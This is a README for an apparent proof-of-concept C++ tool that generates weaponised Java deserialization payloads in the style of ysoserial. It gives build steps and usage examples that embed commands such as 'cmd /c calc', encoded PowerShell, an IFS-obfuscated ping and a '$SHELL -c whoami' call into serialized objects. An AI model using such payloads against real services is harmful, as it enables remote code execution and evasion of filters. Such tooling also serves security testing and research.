  ```
       ▄█    ▄████████ ███▄▄▄▄   ███▄▄▄▄   ▄██   ▄    ▄█          ▄████████ ▀█████████▄  
      ███   ███    ███ ███▀▀▀██▄ ███▀▀▀██▄ ███   ██▄ ███         ███    ███   ███    ███ 
      ███   ███    █▀  ███   ███ ███   ███ ███▄▄▄███ ███         ███    ███   ███    ███ 
      ███  ▄███▄▄▄     ███   ███ ███   ███ ▀▀▀▀▀▀███ ███         ███    ███  ▄███▄▄▄██▀  
      ███ ▀▀███▀▀▀     ███   ███ ███   ███ ▄██   ███ ███       ▀███████████ ▀▀███▀▀▀██▄  
      ███   ███    █▄  ███   ███ ███   ███ ███   ███ ███         ███    ███   ███    ██▄ 
      ███   ███    ███ ███   ███ ███   ███ ███   ███ ███▌    ▄   ███    ███   ███    ███ 
  █▄ ▄███   ██████████  ▀█   █▀   ▀█   █▀   ▀█████▀  █████▄▄██   ███    █▀  ▄█████████▀  
  ▀▀▀▀▀▀                                             ▀                                   
```



# whysoserial-cpp

![image](https://github.com/user-attachments/assets/da6827fc-b24f-4b6d-8faa-fc99d5a233e5)




## whysoserial-cpp ( PoC )
Implementation of Java object serializations in C++ an weaponizing functionalitity ( a lost day... than yoserial )

GNU GPL3 License ( JennyLab OpenSource )
    

### Build

```
g++ -std=c++17 -O2 -o whysoserial-cpp ysoserial.cpp
```
or

```
mkdir build
cd build
cmake ..
make
```

or

```
make
```


### Payload inject execution commands abusing serialization

```
./whysoserial-cpp templates "cmd /c calc"
```

### Encoding

```
./whysoserial-cpp object1 "powershell -enc <base64_command>"
```
        
### Obfucation 

```
./whysoserial-cpp object2 "p\${IFS}ing\${IFS}8.8.8.8"
```
        
### Inyecting ENV

```
./whysoserial-cpp templates "\$SHELL -c 'whoami'"
```




## Code "whysoserial-cpp.cpp"
```
  whysoserial.cpp   # whysoserial-cpp
  ├── JavaSerialization   # Constants and types
  ├── JavaPayloadGen # Main class to make and object in C++ to serialize this serialization with provide and destination in seralize... Seria... Lize!!!
```                                                           




